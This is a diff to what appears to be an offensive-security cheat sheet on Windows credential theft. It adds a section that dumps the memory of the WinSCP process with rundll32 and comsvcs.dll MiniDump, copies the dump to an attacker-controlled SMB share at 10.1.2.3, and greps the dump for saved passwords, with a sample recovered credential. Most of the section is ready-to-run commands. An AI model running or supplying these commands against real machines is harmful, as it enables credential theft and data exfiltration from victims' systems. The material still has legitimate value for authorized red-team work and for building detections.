@@ -1261,7 +1261,7 @@ Execute the exported function on the target host.<br />
 On Linux, recover the hashes from the exported files.<br />
 `secretsdump.py -system system -sam sam -security security LOCAL`
 
-## >> Dumping lsass.exe using Windows comsvcs.dll
+## >> Dumping lsass.exe using comsvcs.dll
 
 **Powershell method**
 
@@ -1338,3 +1338,26 @@ Restore the configuration of the unused service.<br />
 ```
 sc config ImapiService binPath= "C:\WINDOWS\system32\imapi.exe" start= disabled
 ```
+
+## >> Dumping WinSCP passwords from memory using comsvcs.dll
+
+Assumes attacking host 10.1.2.3 has an anonymous writable SMB share to receive the dmp file.<br />
+Assumes a command prompt with administrator privileges is in use.<br />
+```
+wmic process where name^="winscp.exe" get Processid | findstr /r /c:"[0-9]" > %TEMP%\winscp.pid
+
+set /p varpid= < %TEMP%\winscp.pid
+
+del %TEMP%\winscp.pid
+
+set varpid=%varpid: =%
+
+C:\windows\system32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %varpid% %TEMP%\winscp.dmp full
+
+timeout /t 5 && move /y %TEMP%\winscp.dmp \\10.1.2.3\smbwrite
+```
+Search for credentials in winscp.dmp on the attacking host.<br />
+`strings winscp.dmp | grep -E "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | more`
+
+Example output:<br />
+`user192.168.20.33Lam3Password!`
